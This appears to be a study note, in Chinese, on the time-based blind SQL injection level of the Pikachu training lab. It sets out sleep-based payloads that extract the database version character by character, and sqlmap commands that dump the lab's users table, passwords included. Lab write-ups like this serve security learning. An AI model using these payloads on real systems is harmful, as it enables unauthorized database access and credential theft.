# pikachu (基于时间的盲注)

### 時間盲注是最沒良心的，成功失敗返回都一樣。


他都只輸出:
```
i don't care who you are!
```


### 猜測
```
select * from member where username ="xxxxx";
```

如果語句正確會睡5秒
```
lili' and sleep(5) #
```


### 這種在盲注在這種時候特別耗費時間。

```
select  hex(substr(version(),1,1)) > 1 AND sleep(5) ;

select  hex(substr(version(),1,1)) > 2 AND sleep(5) ;

select  hex(substr(version(),1,1)) = 35 AND sleep(5) ;

select  hex(substr(version(),1,1)) > 35 AND sleep(5) ;
```

直到錯誤才不會睡



### 這實需要用IF
IF(condition, value_if_true, value_if_false)

```
如果條件 正確 返回1 錯誤 返回0
select IF(  hex(substr(version(),1,1)) > 1,      1,       0)

如果條件 正確 睡5秒 錯誤 返回0
select IF(  hex(substr(version(),1,1)) > 1,      sleep(5),       0)


關鍵 把邏輯反過來

如果條件 正確 返回0 錯誤 睡5秒

select IF(  hex(substr(version(),1,1)) > 1,      0,       sleep(5))


這樣節省一堆時間，直到錯誤才會睡五秒
select IF(  hex(substr(version(),1,1)) > 35,      0,       sleep(5))
```


### 因此可以組成類似這樣的語句

```
select username from users where username ="admin" AND IF(  hex(substr(version(),1,1)) > 1,      0,       sleep(5));


select username from users where username ="admin" AND IF(  hex(substr(version(),1,1)) > 35,      0,       sleep(5));
```


### 根據此題


```
lili' AND IF(  hex(substr(version(),1,1)) > 1,      0,       sleep(5)) #


lili' AND IF(  hex(substr(version(),1,1)) > 35,      0,       sleep(5)) #

```


### 最後用sqlmap

```

sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch



获取数据库版本信息：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch --dbs





获取指定数据库的所有表名：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu --tables





获取指定数据库表的所有列名：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu -T users --columns



获取指定数据库表中的所有数据：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu -T users --dump


指定特定數據
sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch --sql-query "SELECT username from users"

sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch --sql-query "SELECT password from users"
```